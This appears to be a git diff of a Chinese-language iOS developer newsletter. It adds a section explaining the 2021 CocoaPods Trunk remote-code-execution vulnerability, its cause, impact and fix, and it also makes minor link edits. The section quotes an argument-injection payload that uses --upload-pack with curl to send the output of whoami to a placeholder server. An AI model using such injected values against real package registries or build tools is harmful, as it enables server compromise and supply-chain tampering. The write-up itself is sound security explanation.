@@ -6,10 +6,6 @@ iOS摸鱼周报，主要分享大家开发过程遇到的经验教训及学习�
 
 周报仓库在这里：https://github.com/zhangferry/iOSWeeklyLearning ，可以查看README了解贡献方式；另可关注公众号：iOS成长之路，后台点击进群交流，联系我们。
 
-## 开发Tips
-
-
-
 ## 那些Bug
 
 ### iOS 蓝牙设备名称缓存问题总结
@@ -43,6 +39,58 @@ func centralManager(_ central: CBCentralManager, didDiscover peripheral: CBPerip
     let localName = advertisementData["kCBAdvDataLocalName"]
 }
 ```
+
+### CocoaPods 漏洞分析
+
+问题贡献：[weiminghuaa](https://github.com/weiminghuaa)
+
+**问题背景**
+
+cocoapod的解释：https://blog.cocoapods.org/CocoaPods-Trunk-RCE/  
+
+发现者的文章：https://justi.cz/security/2021/04/20/cocoapods-rce.html
+
+  hack news: https://news.ycombinator.com/item?id=26874726
+
+**问题原因**
+
+原因是cocoapod的源码中有这一段：
+
+```ruby
+system('git', 'ls-remote', @specification.source[:git], ref.to_s)
+```
+
+其中的`:git`，是这段
+
+```ruby
+source：{"git":"https://github.com/SDWebImage/SDWebImage.git","tag”:”5.9.5”}
+```
+
+中的git参数。即拼接执行`git ls-remote https://github.com/SDWebImage/SDWebImage.git`
+
+可能被攻击，即如果这样设置
+
+```ruby
+source：{"source":{"git":"--upload-pack="$(curl my-server:4775/`whoami`)" https://github.com/","tag":"1.0.0"}}
+```
+
+那么拼接执行 
+
+```ruby
+git ls-remote --upload-pack="$(curl my-server:4775/whoami)" https://github.com/
+```
+
+导致`--upload-pack` 的语句 `$(curl my-server:4775/whoami)`执行。它能够使调用者直接获取到对应仓库的操作权限，做一些修改公有库的操作。
+
+这种问题类似于sql注入漏洞，即拼接 string 后执行，很容易在拼接 string 过程中，没做检验，导致出现漏洞，实际运行时，很容易被注入没预料到的命令或参数，执行后出现问题 。
+
+**影响范围**
+
+该问题已经存在了6年，但 CocoaPods 官方无法证明在这期间是否有人利用了这个漏洞，也不能自动去检测所有的库是否被上传了错误的版本。如果你想确认自己维护的库是否遭遇了这种问题，可以通过这个网站协助校验：https://pod-sources.cocoapods.org。
+
+**问题修复**
+
+由Pod官方修复，放弃了 `git ls-remote` 命令，改手动检验 `git remote`。对于在这之前的session keys都进行了清除工作，所以对于在这之后需要向公有库提交的作者需要重新登录以生成新的keys。
 
 ## 编程概念
 
@@ -183,13 +231,13 @@ Swift崛起一直是大家的共识，但是缺少量化数据。本文对Swift�
 
 由新加坡国立大学的教授和学生发起、制作并完善的「数据结构和算法动态可视化」网站，在该网站你可以看到许多经典、非经典的，常见的、非常见的算法的可视化，清晰明了的图形化表现和实时的代码解读可以帮助读者更好地理解各种算法及数据结构。同时该网站支持自动问题生成器和验证器（在线测验系统）。
 
-![Animation of Graph Traversal Algorithm](https://www.comp.nus.edu.sg/images/resources/20200309-graph-traversal.gif)
+![](https://gitee.com/zhangferry/Images/raw/master/iOSWeeklyLearning/20210430185031.png)
 
 ### [Announcing our Deprecated Books Repo!](https://www.raywenderlich.com/21965623-announcing-our-deprecated-books-repo)
 
-raywenderlich 是一个学习编程的网站，他们有很大一部分课程和 `iOS` / `Swift` 有关。最近他们开源了一批将要被废弃的书籍。笔者看过其中的 `2D Games`、`3D Games`、`ARKit` 等书籍，其中介绍了 `SpriteKit` 和 `SceneKit` 的相关知识，书本会带着读者循序渐进，了解这些框架的原理以及如何应用。这次名单中还包含了 `Unity AR & VR`、`Realm` 和 `Server Side` 相关的书籍，这些书对于想要学习这些特定领域内容的读者来说是很好的选择。
+[raywenderlich](https://www.raywenderlich.com) 是一个学习编程的网站，他们有很大一部分课程和 `iOS` / `Swift` 有关。最近他们开源了一批将要被废弃的书籍，主要是相对「过时」，没有更新必要的书籍。笔者看过其中的 `2D Games`、`3D Games`、`ARKit` 等书籍，其中介绍了 `SpriteKit` 和 `SceneKit` 的相关知识，书本会带着读者循序渐进，了解这些框架的原理以及如何应用。这次名单中还包含了 `Unity AR & VR`、`Realm` 和 `Server Side` 相关的书籍，这些书对于想要学习这些特定领域内容的读者来说是很好的选择。
 
-
+可以在这里下载：[deprecated-books](https://github.com/raywenderlich/deprecated-books "deprecated-books")
 
 ## 工具推荐
 
